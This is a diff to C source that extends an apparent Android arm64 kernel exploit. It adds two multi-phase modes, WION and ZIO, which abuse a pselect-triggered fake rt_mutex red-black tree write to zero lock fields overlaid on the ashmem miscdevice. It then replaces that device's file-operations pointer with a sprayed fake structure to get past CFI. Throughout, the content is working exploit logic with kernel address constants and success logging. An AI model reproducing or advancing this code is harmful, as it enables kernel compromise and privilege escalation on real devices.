@@ -28,8 +28,24 @@ static double fops_elapsed_ms(struct timespec *ref) {
  *   *MISC without ever setting W0.left=MISC.
  *   1 ZERO_NAME leaf *name=0
  *   2 ION_SAFE root *MISC=fake_fops
+ *
+ * MODE4_WION=1 (2 phases — wait_lock clear without name=NULL):
+ *   wait_lock is u32 at &ashmem_misc.name (MISC-8). qspinlock unlocked iff 0.
+ *   only-left *name = P0_PAGE_OFFSET (0xffffff8000000000) → low32=0 → wait_lock=0
+ *   while name stays a high canonical kernel-ish value (not NULL).
+ *   Then ION root *MISC=fake_fops (left=0, no toxic re-enqueue walk).
+ *   1 WAITLOCK0 only-left left=MISC-8 parent=PAGE_OFFSET
+ *   2 ION_SAFE
+ *
+ * MODE4_ZIO=1 (3 phases — preferred product path 2026-08-16):
+ *   ION lock=MISC-8 overlays: wait_lock=name, waiters=MISC, owner=MISC+16.
+ *   ZERO_NAME ALIVE (consumer); bare ION after zero softboots — likely garbage
+ *   owner at MISC+16. Zero owner then root-erase *MISC=fake_fops.
+ *   1 ZERO_NAME leaf *name=0 (wait_lock)
+ *   2 ZERO_OWNER leaf *(MISC+16)=0 (rt_mutex.owner overlay)
+ *   3 ION_SAFE parent=1 right=fake_fops left=0 lock=MISC-8
  */
-static int g_mode4_chain_phase; /* 0=off; CHAIN 1..3; ZION/ZI 1..2; PAD3 1..3 */
+static int g_mode4_chain_phase; /* 0=off; CHAIN/ZIO 1..3; ZION/ZI/WION 1..2; PAD3 1..3 */
 extern int pselect_custom_write;
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
@@ -167,6 +183,8 @@ void open_selected_fds(
                    env_flag("MODE4_CHAIN", 0) ||
                    env_flag("MODE4_ZION", 0) ||
                    env_flag("MODE4_ZI", 0) ||
+                   env_flag("MODE4_WION", 0) ||
+                   env_flag("MODE4_ZIO", 0) ||
                    env_flag("MODE4_PAD3", 0) ||
                    env_flag("MODE4_FOPS_SLOT", 0) ||
                    env_flag("MODE4_KIMAGE_MISC", 0) ||
@@ -469,6 +487,26 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     "(*tgt=fake_fops; main-only default on CPH)\n",
                     (unsigned long long)parent_pc, (unsigned long long)tgt, dual);
           }
+        } else if ((env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 1) ||
+                   env_flag("MODE4_WAITLOCK0", 0)) {
+          /*
+           * Clear wait_lock without name=NULL: store P0_PAGE_OFFSET into name.
+           * arm64 qspinlock is u32 at &name → needs low 32 bits == 0.
+           * 0xffffff8000000000 has low32=0. Prefer over parent=0 (name=NULL softboot).
+           */
+          uint64_t wl0 = 0xffffff8000000000ULL; /* P0_PAGE_OFFSET / physmap base */
+          tree_pc = wl0;
+          tree_r = 0;
+          tree_l = misc - 8;
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = 0;
+          stack_lock = fake_lock;
+          stack_prio = 3;
+          stack_deadline = 0;
+          pr_info("stack mode4 WAITLOCK0 only-left parent=PAGE_OFFSET "
+                  "left=MISC-8(name)=%016llx (*name=..8000000000 → wait_lock=0)\n",
+                  (unsigned long long)(misc - 8));
         } else if (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 1) {
           /*
            * ZION phase1: only-left *name=0. left=&name (MISC-8), parent_color=0.
@@ -604,8 +642,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)misc);
         } else if (env_flag("MODE4_ZERO_NAME", 0) ||
                    (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 1) ||
+                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 1) ||
                    (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 1 &&
-                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0))) {
+                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0) &&
+                    !env_flag("MODE4_ZIO", 0))) {
           /*
            * Leaf parent=MISC-16 → __rb_change_child else → *name=0.
            * left=right=0 so re-enqueue does not walk MISC (unlike only-left).
@@ -624,8 +664,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   "left=0 prio=200 (leaf → *name=0; chain_phase=%d)\n",
                   (unsigned long long)tree_pc, g_mode4_chain_phase);
         } else if (env_flag("MODE4_ZERO_OWNER", 0) ||
+                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 2) ||
                    (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 2 &&
-                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0))) {
+                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0) &&
+                    !env_flag("MODE4_ZIO", 0))) {
           /*
            * CHAIN phase2: leaf parent=MISC+8 (miscdevice.list as rb_node).
            * __rb_change_child else → parent->rb_right=NULL → *(MISC+16)=0.
@@ -663,11 +705,13 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         } else if (env_flag("MODE4_ION_ROOT", 0) || env_flag("MODE4_ION_SAFE", 0) ||
                    (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 3) ||
                    (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
-                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2)) {
+                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
+                   (env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 2) ||
+                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 3)) {
           /*
            * Ion root: lock=MISC-8, parent=1, right=fake_fops leaf, left=0.
-           * root erase → *MISC=fake_fops; re-enqueue walks fake_fops leaf only
-           * (never W0.left=MISC). Needs wait_lock=0 (MODE4_ZI phase1 ZERO_NAME).
+           * Overlays: wait_lock=name, waiters=*MISC, owner=*(MISC+16).
+           * Needs wait_lock=0 and owner=0 (ZIO phases 1–2) or race softboot.
            */
           tree_pc = 1;
           tree_r = fake_fops;
@@ -683,6 +727,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (env_flag("MODE4_ION_SAFE", 0) ||
                    (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
                    (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
+                   (env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 2) ||
+                   (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 3) ||
                    g_mode4_chain_phase == 3)
                       ? "ION_SAFE"
                       : "ION_ROOT",
@@ -991,11 +1037,23 @@ void do_pselect_fake_lock_route(void) {
   int chain = env_flag("MODE4_CHAIN", 0);
   int zion = env_flag("MODE4_ZION", 0);
   int zi = env_flag("MODE4_ZI", 0);
+  int wion = env_flag("MODE4_WION", 0);
+  int zio = env_flag("MODE4_ZIO", 0);
   int pad3 = env_flag("MODE4_PAD3", 0);
-  int max_att = pad3 ? 3 : ((zion || zi) ? 2 : (chain ? 3 : PSELECT_CFI_ROUTE_ATTEMPTS));
+  int max_att = pad3 ? 3
+                     : (zio || chain ? 3
+                                    : ((zion || zi || wion)
+                                           ? 2
+                                           : PSELECT_CFI_ROUTE_ATTEMPTS));
   if (pad3)
     pr_info("MODE4_PAD3=1: phase1 MISC+16=0, phase2 MISC+8=0, "
             "phase3 *MISC=fake_fops (pad toxic rb neighbors)\n");
+  else if (zio)
+    pr_info("MODE4_ZIO=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
+            "phase3 ION_SAFE (wait_lock+owner quiet then *MISC)\n");
+  else if (wion)
+    pr_info("MODE4_WION=1: phase1 WAITLOCK0 *name=PAGE_OFFSET (wait_lock=0), "
+            "phase2 ION_SAFE root *MISC=fake_fops\n");
   else if (zi)
     pr_info("MODE4_ZI=1: phase1 ZERO_NAME leaf *name=0, phase2 ION_SAFE "
             "root *MISC=fake_fops (avoid only-left MISC re-enqueue walk)\n");
@@ -1006,14 +1064,14 @@ void do_pselect_fake_lock_route(void) {
     pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
             "phase3 ION_SAFE (same process; rb-leaf fops)\n");
   for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
-    if (pad3 || zion || zi || chain)
+    if (pad3 || zion || zi || wion || zio || chain)
       g_mode4_chain_phase = route_attempt;
     else
       g_mode4_chain_phase = 0;
     if (route_attempt != 1) {
-      /* CHAIN/ZI phase2+: reuse spray so fake_fops leaf stays; zeros are in kernel. */
       int reuse_page =
-          (chain || zion || zi || pad3) && route_attempt >= 2 && page_base && fake_fops;
+          (chain || zion || zi || wion || zio || pad3) && route_attempt >= 2 &&
+          page_base && fake_fops;
       if (!reuse_page) {
         page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
         if (!page_base || !fake_lock || !fake_fops) {
@@ -1026,11 +1084,17 @@ void do_pselect_fake_lock_route(void) {
         }
       } else {
         pr_info("MODE4_%s reuse FOPS page phase=%d\n",
-                pad3 ? "PAD3" : (zi ? "ZI" : (zion ? "ZION" : "CHAIN")),
+                pad3 ? "PAD3"
+                     : (zio ? "ZIO"
+                            : (wion ? "WION"
+                                    : (zi ? "ZI" : (zion ? "ZION" : "CHAIN")))),
                 g_mode4_chain_phase);
         durable_proof_log(pad3 ? "pad3_reuse_page"
-                               : (zi ? "zi_reuse_page"
-                                     : (zion ? "zion_reuse_page" : "chain_reuse_page")));
+                               : (zio ? "zio_reuse_page"
+                                      : (wion ? "wion_reuse_page"
+                                              : (zi ? "zi_reuse_page"
+                                                    : (zion ? "zion_reuse_page"
+                                                            : "chain_reuse_page")))));
       }
     }
 
@@ -1222,15 +1286,65 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (chain || zion || zi || pad3) {
+    if (chain || zion || zi || wion || zio || pad3) {
       char cbuf[160];
-      const char *tag = pad3 ? "PAD3" : (zi ? "ZI" : (zion ? "ZION" : "CHAIN"));
+      const char *tag = pad3 ? "PAD3"
+                             : (zio ? "ZIO"
+                                    : (wion ? "WION"
+                                            : (zi ? "ZI"
+                                                  : (zion ? "ZION" : "CHAIN"))));
       snprintf(cbuf, sizeof(cbuf),
                "%s_phase=%d success=%d calls=%d cfi_step=%d cfi_errno=%d "
                "cfi_wr=%zd",
                tag, route_attempt, success, calls, cfi_last_step, cfi_last_errno,
                cfi_write_ret);
       live_sync_log(tag, cbuf);
+    }
+    if (zio && route_attempt == 1 && success > 0) {
+      live_sync_log("ZIO", "phase1_ZERO_NAME_ok");
+      continue;
+    }
+    if (zio && route_attempt == 1 && success <= 0) {
+      live_sync_log("ZIO", "phase1_ZERO_NAME_FAIL");
+      break;
+    }
+    if (zio && route_attempt == 2 && success > 0) {
+      live_sync_log("ZIO", "phase2_ZERO_OWNER_ok_next_ION");
+      continue;
+    }
+    if (zio && route_attempt == 2 && success <= 0) {
+      live_sync_log("ZIO", "phase2_ZERO_OWNER_FAIL");
+      break;
+    }
+    if (zio && route_attempt == 3) {
+      char ibuf[128];
+      snprintf(ibuf, sizeof(ibuf),
+               "phase3_ION success=%d cfi_step=%d cfi_errno=%d wr=%zd",
+               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
+      live_sync_log("ZIO", ibuf);
+      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
+        live_sync_log("ZIO", "FOPS_CFI_HIT");
+    }
+    if (wion && route_attempt == 1 && success > 0) {
+      live_sync_log("WION", "phase1_WAITLOCK0_ok_next_ION");
+      durable_proof_log("wion_waitlock0_done");
+      pr_info("MODE4_WION phase1 WAITLOCK0 done success=%d → ION_SAFE\n",
+              success);
+      continue;
+    }
+    if (wion && route_attempt == 1 && success <= 0) {
+      live_sync_log("WION", "phase1_WAITLOCK0_FAIL_stop");
+      pr_warning("MODE4_WION phase1 WAITLOCK0 no walk — stop\n");
+      break;
+    }
+    if (wion && route_attempt == 2) {
+      char ibuf[128];
+      snprintf(ibuf, sizeof(ibuf),
+               "phase2_ION success=%d cfi_step=%d cfi_errno=%d wr=%zd",
+               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
+      live_sync_log("WION", ibuf);
+      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
+        live_sync_log("WION", "FOPS_CFI_HIT");
     }
     if (zi && route_attempt == 1 && success > 0) {
       live_sync_log("ZI", "phase1_ZERO_NAME_ok_next_ION");
